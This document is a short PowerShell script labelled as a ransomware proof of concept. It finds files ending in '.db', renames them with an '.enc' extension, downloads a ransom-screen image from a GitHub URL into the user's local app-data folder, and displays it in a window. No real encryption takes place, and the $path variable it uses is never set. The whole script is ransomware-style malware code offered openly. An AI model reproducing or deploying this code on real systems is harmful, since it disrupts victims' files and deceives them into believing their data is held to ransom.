# BTBit Powershell Ransomware PoC 
# param([string]$showscreen)
# file to rename
$filter = ".db"
#$drive = (get-location).Drive.Name
$file_count = (gci -Path $path -File | where fullname -like "*$filter").Count
if ($file_count -eq "0") { exit }
get-childitem -path $path -filter "*$filter" | rename-item -newname {$_.name -replace "$filter","$filter.enc"}
#
# show encryption screen
if ($showscreen -eq "noscreen") {exit}
$screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
sleep 10
[void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")
Add-Type -AssemblyName 'System.Windows.Forms'
#$file = (get-item '\\192.168.1.127\Documents\ataque\screen.png')
$img = [System.Drawing.Image]::Fromfile((get-item $screen))

[System.Windows.Forms.Application]::EnableVisualStyles()
$form = new-object Windows.Forms.Form
$form.Text = "Image Viewer"
$form.Width = $img.Size.Width;
$form.Height =  $img.Size.Height;
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width =  $img.Size.Width;
$pictureBox.Height =  $img.Size.Height;

$pictureBox.Image = $img;
$form.controls.add($pictureBox)
$form.Add_Shown( { $form.Activate() } )
$form.ShowDialog()
